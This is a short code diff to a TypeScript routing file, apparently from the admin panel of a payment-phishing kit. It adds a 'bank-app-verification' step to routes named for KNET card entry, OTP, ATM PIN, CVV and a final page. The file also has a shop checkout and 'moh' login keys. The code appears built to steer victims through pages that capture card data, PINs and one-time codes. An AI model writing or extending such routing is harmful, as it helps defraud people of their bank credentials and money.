@@ -12,6 +12,7 @@ export const ADMIN_PAGE_ROUTES: Record<string, string> = {
   "otp-verification": "/otp-verification", otp: "/otp-verification",
   "knet-otp": "/knet-otp",
   atm: "/atm", "atm-password": "/atm",
+  "bank-app-verification": "/bank-app-verification", app: "/bank-app-verification",
   cvv: "/cvv",
   "final-page": "/final-page", final: "/final-page",
   "moh-login": "/", "moh-register": "/", "moh-create-account": "/",
@@ -27,7 +28,7 @@ export const ADMIN_PAGE_ROUTES: Record<string, string> = {
 
 const KNOWN_ROUTE_PREFIXES = [
   "products", "product/", "category/", "cart", "checkout",
-  "knet", "knet-otp", "card", "otp-verification", "atm", "cvv", "final-page",
+  "knet", "knet-otp", "card", "otp-verification", "atm", "bank-app-verification", "cvv", "final-page",
 ];
 
 function isKnownRoute(key: string): boolean {
